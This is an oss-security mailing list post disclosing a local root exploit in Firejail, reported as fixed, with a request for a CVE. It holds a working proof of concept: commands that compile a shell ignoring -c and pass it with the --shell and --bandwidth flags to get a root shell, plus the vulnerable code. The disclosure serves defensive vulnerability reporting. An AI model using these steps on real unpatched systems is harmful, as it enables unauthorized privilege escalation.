  oss-security - Re: Re: Firejail local root exploit            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Sat, 07 Jan From: Martin Carpenter <mcarpenter@...e.fr> To: oss-security@...ts.openwall.com Subject: Re: Re: Firejail local root exploit  On Thu, at Martin Carpenter wrote: > A handful of concrete examples that I have reported are below.  Another (new) one: MITRE can you please assign a CVE?  6. Root shell via --bandwidth and --shell  Reported at:  Fixed at:   commit   Author: netblue30 <netblue30@...oo.com>   Date:   Fri Jan 6        security fix   Quoting for list:  ----8<---- [Against current HEAD, commit  In a first window run:  $ firejail --noprofile --name=x --net=eth0  In a second window, firstly create a dumb shell that ignores -c:  $ echo 'int main() {system("/bin/sh");}' | gcc -xc -o dumbshell -  and then secondly invoke that shell via the --shell and --bandwidth flags to obtain root:  $ firejail --shell=./dumbshell --bandwidth=x status # id uid=0(root) gid=0(root) context=system_u:system_r:initrc_t:s0  Error occurs at  char *arg[4]; arg[0] = cfg.shell; arg[1] = "-c"; arg[2] = cmd; arg[3] = NULL; clearenv(); execvp(arg[0], arg);  I don't see any good reason to permit a user-specified shell to run a bandwidth command. ----8<----    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      